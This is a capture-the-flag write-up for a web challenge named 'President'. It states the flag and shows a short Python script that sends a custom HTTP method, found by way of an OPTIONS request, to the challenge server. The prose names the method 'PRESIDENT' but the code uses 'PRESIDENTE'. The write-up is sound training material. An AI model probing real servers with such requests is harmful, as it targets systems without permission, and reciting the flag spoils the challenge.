# President
<p align="center">
  <img src="Attachments/Description.png" />
</p>

## FLAG:
` hctf{cust0m_ht7p_m3thod_1s_alway5_4_th1ng}` 

## Solution

the challenge is really simple because it is a web page with some static content. I tried changing the http request type from GET to OPTIONS and it showed up among the various requests "PRESIDENT" and with the help of python I set up that custom http request using the generic request method as shown below to take the flag.

```python
import requests

burp0_url = "https://president.hackappatoi.com/"
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7", "Priority": "u=0, i"}
print(requests.request("PRESIDENTE",url=burp0_url, headers=burp0_headers).text)
```

